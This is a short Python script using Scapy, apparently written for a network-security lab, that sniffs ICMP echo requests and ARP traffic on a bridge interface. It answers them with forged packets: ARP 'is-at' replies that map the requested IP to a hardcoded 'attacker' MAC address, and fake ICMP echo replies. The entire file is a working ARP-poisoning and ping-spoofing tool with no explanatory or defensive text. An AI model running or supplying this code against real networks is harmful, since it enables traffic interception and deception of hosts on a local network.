#!/usr/bin/env python3

from scapy.all import *
from time import sleep

def spoofing(pkt) :
	print("========== sniffed packet =========")
	print(pkt[Ether].type)
	attacker_mac = "02:42:0d:80:e9:c5"
	pkt.show()
	if (pkt[Ether].type == 0x0806) :
		pkt[Ether].dst = pkt[Ether].src
		pkt[Ether].src = attacker_mac

		temp = pkt[ARP].psrc
		pkt[ARP].psrc = pkt[ARP].pdst
		pkt[ARP].pdst = temp

		pkt[ARP].hwdst = pkt[ARP].hwsrc
		pkt[ARP].hwsrc = attacker_mac

		pkt[ARP].op = "is-at"
			
	else :

		pkt[ICMP].type = 'echo-reply'
	 
		src_ip  = pkt[IP].src
		dst_ip  = pkt[IP].dst
		src_mac = pkt[Ether].src
		dst_mac = pkt[Ether].dst

		pkt[IP].src = dst_ip
		pkt[IP].dst = src_ip
		pkt[Ether].src = dst_mac 
		pkt[Ether].dst = src_mac

	print("======== spoofed packet ===========")
	sendp(pkt)
	pkt.show()

pkt = sniff(iface='br-1bfc3864daa5', filter='icmp[icmptype] == icmp-echo or arp', prn=spoofing)


